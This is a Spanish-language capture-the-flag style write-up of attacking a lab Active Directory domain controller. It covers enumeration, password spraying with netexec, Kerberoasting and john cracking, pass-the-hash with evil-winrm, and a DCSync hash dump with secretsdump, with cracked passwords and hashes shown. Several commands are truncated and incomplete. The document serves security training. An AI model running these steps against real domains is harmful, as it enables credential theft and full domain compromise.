# 🖥️ Máquina: dc01

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Windows — Active Directory  
> **Categoría:** Active Directory  
> **Técnicas trabajadas:** Enumeración AD (LDAP · SMB · Kerberos) · Fuerza bruta SMB (netexec) · Kerberoasting · Cracking de TGS (john) · Pass-the-Hash · evil-winrm · impacket-secretsdump  
> **Descripción:** En esta práctica atacaremos un controlador de dominio Windows con Active Directory. Enumeraremos servicios, extraeremos usuarios vía LDAP con impacket, realizaremos fuerza bruta de credenciales con netexec, aplicaremos la técnica Kerberoasting para obtener tickets TGS crackeables offline, accederemos a recursos SMB con las credenciales obtenidas y finalmente usaremos Pass-the-Hash con evil-winrm para comprometer el sistema completo y hacer un volcado de todos los hashes del dominio con secretsdump.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

## 🔎 Fase 1: Enumeración de servicios

Comenzamos con un escaneo de servicios. Usamos -Pn para saltar el ping ya que los sistemas Windows suelen ignorar los pings por defecto en redes internas:

```bash
nmap -sT -p- 10.0.0.23 -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49703/tcp open  unknown
49749/tcp open  unknown
```

> [!info] Resultado
> Findings:
> · Puertos clásicos de Active Directory abiertos → 88 (Kerberos), 389 (LDAP), 445 (SMB), 135/139 (RPC/NetBIOS), 3268/3269 (Global Catalog), 636 (LDAP SSL), 593 (HTTP RPC).
> · WinRM activo → puerto 5985, muy útil para acceso remoto si conseguimos credenciales.
> · AD Web Services en 9389, relacionado con consultas SOAP a Active Directory. Esto permite a programas (o scripts) consultar y administrar objetos de Active Directory a través de mensajes SOAP en XML.
> · 53 (DNS) indica que el servidor probablemente actúa como DC (Domain Controller).
> · Los puertos altos (49664+) suelen ser RPC dinámicos en Windows.

## 📁 Fase 2: Enumeración SMB

Ahora vamos por SMB a intentar encontrar algo probando o bien credenciales vacías o bien el usuario invitado de Windows. smbclient -L lista los recursos compartidos disponibles. SMB (Server Message Block) es el protocolo de Windows para compartir archivos e impresoras en red, y es una fuente de información muy valiosa en auditorías de Active Directory:

```bash
smbclient -L 10.0.0.23
```

```text
Password for [WORKGROUP\tecnico]:
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	Users           Disk
```

> [!info] Resultado
> El servidor tiene los shares típicos de un Domain Controller (NETLOGON, SYSVOL, Users), además de algunos personalizados (backup). Nos interesan en principio backup y Users.
> Al ser un DC, NETLOGON y SYSVOL son críticos: SYSVOL guarda políticas de grupo (GPOs), scripts de logon, etc. Si accediéramos, podríamos encontrar scripts con contraseñas en texto plano o configuraciones inseguras.
> Tratamos de conectar sin credenciales a los recursos disponibles:

```bash
smbclient \\\\10.0.0.23\\Users
```

```text
Password for [WORKGROUP\tecnico]:
```

Una vez dentro probamos ls o dir:

```bash
ls
```

```bash
dir
```

```text
NT_STATUS_ACCESS_DENIED listing \*
```

> [!info] Resultado
> Obtenemos continuamente acceso denegado. El hecho de que listing aparezca implica que -L de smbclient funciona, que estamos dentro pero el acceso anónimo o con guest está restringido. Salimos de smb:

```bash
exit
```

Vamos a intentar con el usuario invitado de Windows. smbmap muestra los permisos de cada recurso compartido de forma más visual que smbclient, indicando si tenemos READ, WRITE o NO ACCESS en cada uno:

```bash
smbmap -H 10.0.0.23 -u
```

```text
[+] IP: 10.0.0.23:445	Name: 10.0.0.23      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	backup                                            	NO ACCESS	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS
```

> [!info] Resultado
> Mismos dos recursos, y hay un READ ONLY en el recurso IPC$ por lo que vamos a ver si hay información relevante dentro. IPC$ (Inter-Process Communication) es un recurso especial de Windows que permite comunicación entre procesos a través de la red, pero raramente contiene archivos útiles:

```bash
smbclient //10.0.0.23/IPC$
```

```text
smb: \> ls
NT_STATUS_NO_SUCH_FILE listing \*
```

```bash
smbclient //10.0.0.23/Users
```

```text
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

```bash
exit
```

> [!info] Resultado
> Seguimos sin poder obtener información por este servicio. Aunque confirma que Guest login funciona pero no aporta acceso real a datos. Tenemos que conseguir credenciales válidas para poder acceder al SMB, por lo que seguimos por LDAP a intentar enumerar algo en el Active Directory.

## 📋 Fase 3: Enumeración LDAP — obtención del dominio y usuarios

Comenzamos con el propio nmap sobre el puerto 389. LDAP (Lightweight Directory Access Protocol) es el protocolo que usa Active Directory para exponer su base de datos de objetos (usuarios, grupos, equipos, políticas...). En entornos mal configurados permite consultas anónimas que revelan información valiosa del dominio:

```bash
nmap -A -p 389 10.0.0.23 -Pn
```

```text
389/tcp open  ldap    Microsoft Windows Active Directory LDAP
(Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

> [!info] Resultado
> De donde podemos ver la siguiente información:
> · Dominio: SOUPEDECODE.LOCAL — el nombre de dominio Active Directory al que pertenece la máquina. Muy importante, porque a partir de aquí ya sabemos cómo formar UPNs y nombres NetBIOS de usuarios:
> · Formato UPN: usuario@soupedecode.local
> · Formato NTLM/NetBIOS: SOUPEDECODE\usuario
> · Hostname: DC01 — el nombre del controlador de dominio. Muy útil porque ya sabemos a qué host apuntar cuando hagamos ataques Kerberos, LDAP o SMB.
> · SO / CPE: Windows — confirma que estamos ante un Windows Server.
> Otra forma de obtener el nombre de dominio es mediante el comando ldapsearch, que realiza consultas directas al servidor LDAP sin necesidad de credenciales:

```bash
ldapsearch -x -LLL -H ldap://10.0.0.23 -s base -b
```

```text
rootDomainNamingContext: DC=SOUPEDECODE,DC=LOCAL
dnsHostName: DC01.SOUPEDECODE.LOCAL
```

Editamos nuestro archivo de hosts local de Kali para añadir el nombre del dominio y la IP:

```bash
sudo nano /etc/hosts
```

```text
10.0.0.23  SOUPEDECODE.LOCAL       DC01.SOUPEDECODE.LOCAL
```

> [!info] Resultado
> Guardamos con CTRL+O y salimos con CTRL+X.
> Usamos impacket-lookupsid para extraer los usuarios del dominio. Este script de la suite Impacket enumera los SIDs (Security Identifiers — identificadores únicos de cada objeto en Windows) del dominio mediante el protocolo MS-RPC. Al iterar por rangos de SIDs puede descubrir todos los usuarios y grupos del dominio sin necesidad de credenciales en muchos entornos. Guardamos la salida en un archivo para usarlo después como diccionario de usuarios:

```bash
impacket-lookupsid SOUPEDECODE.LOCAL/guest@10.0.0.23 | cut -d
```

> [!info] Resultado
> Pulsamos enter cuando pida la contraseña. Comprobamos que tenemos el listado de usuarios:

```bash
cat users_dc01.txt
```

## 🔑 Fase 4: Fuerza bruta de credenciales con netexec

netexec (sucesor de crackmapexec) es una navaja suiza para auditorías de Active Directory. Permite probar credenciales, listar shares, ejecutar comandos y mucho más contra protocolos como SMB, WinRM, LDAP y RDP simultáneamente.

Primero probamos con el propio listado de usuarios como diccionario de contraseñas, en busca de si algún usuario usa sus mismas credenciales (user:user). La opción --no-bruteforce prueba cada usuario solo contra su propia contraseña, evitando el bloqueo de cuentas:

```bash
netexec smb 10.0.0.23 -u users_dc01.txt -p users_dc01.txt --continue-on-success --no-bruteforce | grep
```

> [!info] Resultado
> No encuentra esa posibilidad por lo que probamos con el rockyou.txt. --continue-on-success evita que pare al encontrar la primera contraseña válida, --ignore-pw-decoding evita errores con caracteres especiales del diccionario:

```bash
netexec smb 10.0.0.23 -u users_dc01.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success --ignore-pw-decoding | grep -v
```

> [!info] Resultado
> Si vemos que tarda mucho podemos probar directamente con el usuario que tiene éxito:

```bash
netexec smb 10.0.0.23 -u ybob317 -p /usr/share/wordlists/rockyou.txt --continue-on-success --ignore-pw-decoding | grep -v
```

```text
SMB  10.0.0.23  445  DC01  [+] SOUPEDECODE.LOCAL\ybob317:password2
```

> [!info] Resultado
> Credenciales encontradas: ybob317:password2. Ahora comprobamos esas credenciales para ver los permisos que tiene en diferentes servicios de Windows:

```bash
netexec smb 10.0.0.23 -u ybob317 -p password2
```

```bash
netexec winrm 10.0.0.23 -u ybob317 -p password2
```

> [!info] Resultado
> Por WinRM no podemos hacer nada. Por lo que investigamos en los shares de SMB:

```bash
netexec smb 10.0.0.23 -u ybob317 -p password2 --shares
```

```text
SMB  10.0.0.23  445  DC01  Users  READ
```

> [!info] Resultado
> Tenemos permiso de lectura en Users por lo que nos conectamos:

```bash
smbclient //10.0.0.23/Users -U ybob317
```

Y navegamos para capturar la bandera del user:

```bash
cd ybob317
```

```bash
cd Desktop
```

```bash
more user.txt
```

> [!info] Resultado
> Y podemos ver la bandera. Pulsamos la q y salimos del recurso compartido:

```bash
exit
```

## 🎫 Fase 5: Kerberoasting

Ahora que tenemos unas credenciales válidas vamos a usar la técnica Kerberoasting. Esta técnica aprovecha que cualquier usuario autenticado del dominio puede solicitar tickets de servicio Kerberos (TGS — Ticket Granting Service) para cuentas que tengan un SPN (Service Principal Name) registrado. Los SPNs identifican instancias de servicios en el dominio (bases de datos, servidores web internos, etc.).

El TGS que devuelve Kerberos está cifrado con el hash NTLM de la cuenta de servicio. Al obtenerlo podemos intentar crackearlo offline con un diccionario sin generar más tráfico hacia el DC, ya que el cracking se hace en local.

Primero obtenemos la lista de los usuarios registrados en Kerberos con SPN (candidatos a Kerberoasting):

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:password2 -dc-ip 10.0.0.23
```

Y luego los hashes de los tickets de servicio:

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:password2 -dc-ip 10.0.0.23 -request
```

```text
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

> [!info] Resultado
> Hay un problema: el request de los hashes falla por tema de sincronización del reloj. Kerberos es muy estricto con la diferencia de tiempo entre cliente y servidor (máximo 5 minutos por defecto). Si hay más diferencia rechaza los tickets como medida de seguridad para evitar ataques de replay. Por lo que antes en Kali debemos sincronizar el reloj con el Active Directory:

```bash
sudo apt update && sudo apt install ntpsec-ntpdate -y
```

```bash
sudo timedatectl set-ntp false
```

```bash
sudo ntpdate 10.0.0.23
```

> [!info] Resultado
> Ahora con el reloj sincronizado extraemos la información. A tener en cuenta que puede que Kali vuelva a sincronizarse, por lo que tendrás que volver a lanzarlos. Primero la podemos ver:

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:password2 -dc-ip 10.0.0.23 -request
```

Y ahora si la guardamos en un archivo para luego crackearlos offline:

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:password2 -dc-ip 10.0.0.23 -request > dc01_hashes_tgs
```

Importante comprobar que se han guardado los hashes:

```bash
cat dc01_hashes_tgs
```

Ahora vemos si podemos crackear alguno de ellos usando el rockyou y con john. El formato krb5tgs indica a john que son tickets TGS de Kerberos 5, que usan RC4-HMAC como cifrado por defecto y son crackeables offline:

```bash
john dc01_hashes_tgs --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs
```

> [!info] Resultado
> Durante el proceso vemos que se obtiene una contraseña:

```text
file_svc:01vwgolf
```

> [!info] Resultado
> Y vemos que pertenece al usuario file_svc. Podemos ver el resultado guardado en el pot de john:

```bash
cat ~/.john/john.pot
```

Comprobamos ahora nuevamente con este usuario dónde tiene acceso:

```bash
netexec smb 10.0.0.23 -u
```

```text
SMB  10.0.0.23  445  DC01  backup  READ
```

> [!info] Resultado
> Ahora tenemos READ en backup. Nos conectamos para ver el recurso backup:

```bash
smbclient //10.0.0.23/backup -U file_svc
```

> [!info] Resultado
> Dentro del recurso hay un archivo que vamos a descargar para examinar desde Kali:

```bash
get backup_extract.txt
```

```bash
exit
```

De vuelta en Kali vemos el contenido del archivo:

```bash
cat backup_extract.txt
```

> [!info] Resultado
> Los que ves en backup_extract.txt tienen esta estructura:
> <User>:<RID>:<LM hash>:<NT hash>:::
> Esto son hashes NTLM de cuentas de equipo (terminan con $). Suelen tener privilegios locales elevados en esa máquina concreta, y en algunos casos también en otros equipos si hay delegaciones.
> Aunque no sean usuarios humanos, se pueden usar para ataques Pass-the-Hash o para seguir escalando.
> De todos ellos el más interesante podría ser FileServer$ ya que es probable que tenga privilegios sobre el recurso Users o sobre datos sensibles en otros shares:

```text
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
```

## 💻 Fase 7: Pass-the-Hash con evil-winrm

Usando evil-winrm vamos a tratar de conectarnos directamente usando la técnica Pass-the-Hash. Esta técnica permite autenticarse en sistemas Windows usando el hash NTLM directamente, sin necesidad de conocer la contraseña en texto claro. Funciona porque el protocolo de autenticación NTLM usa el hash como factor de autenticación, no la contraseña original, por lo que presentar el hash equivale a presentar la contraseña.

evil-winrm es una herramienta que permite conectarse a sistemas Windows a través del protocolo WinRM (Windows Remote Management, puerto 5985) y obtener una shell PowerShell interactiva. Es el equivalente Windows de SSH para administración remota:

```bash
evil-winrm -i 10.0.0.23 -u
```

```bash
whoami /groups
```

> [!info] Resultado
> Con este usuario podemos ya leer la bandera de root.txt:

```bash
type C:\users\Administrator\desktop\root.txt
```

```text
a9564ebc3289b7a14551baf8ad5ec60a
```

> [!info] Resultado
> Flag de root obtenida: a9564ebc3289b7a14551baf8ad5ec60a
> Pero vamos a ir más allá. Salimos del evil-winrm:

```bash
exit
```

## 🗄️ Fase 8: Volcado total del dominio con secretsdump

Y ahora con este usuario podemos extraer los hashes de todos los usuarios del Active Directory usando su hash. impacket-secretsdump realiza un volcado remoto de credenciales del DC usando la técnica DCSync: simula ser otro controlador de dominio solicitando replicación de datos al DC objetivo a través del protocolo MS-DRSR (Directory Replication Service Remote Protocol). Esto le permite obtener los hashes NTLM de todos los usuarios del dominio sin instalar nada en el servidor ni necesitar acceso físico:

```bash
impacket-secretsdump
```

Mejor lo guardamos en un archivo:

```bash
impacket-secretsdump
```

Y ahora podemos o bien leerlo con nano o filtrar la información interna:

```bash
cat dc01_dump.txt | grep Administrator
```

> [!info] Resultado
> Un historial de hashes del Administrator:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:560a08a9e22ec0dbe09ee4d76c396a4c:::
```

> [!info] Resultado
> Claves que usa Kerberos para generar los tickets:

```text
Administrator:aes256-cts-hmac-sha1-96:722472d99e9a9684a8a5b1f8d28936f57936c3afd95f487a16e409ce5765c4ed
Administrator:aes128-cts-hmac-sha1-96:9f34e80dd3518946b323e839544c2d73
Administrator:des-cbc-md5:26c4b0b97c70e9f7
```

Usamos nuevamente Pass-the-Hash pero con el Hash del usuario Administrator:

```bash
evil-winrm -i 10.0.0.23 -u
```

```bash
evil-winrm -i 10.0.0.23 -u
```

Comprobamos:

```bash
whoami
```

```text
soupedecode\administrator
```

Si queremos ahora capturamos las banderas nuevamente:

```bash
type C:\users\ybob317\desktop\user.txt
```

```bash
type C:\users\Administrator\desktop\root.txt
```
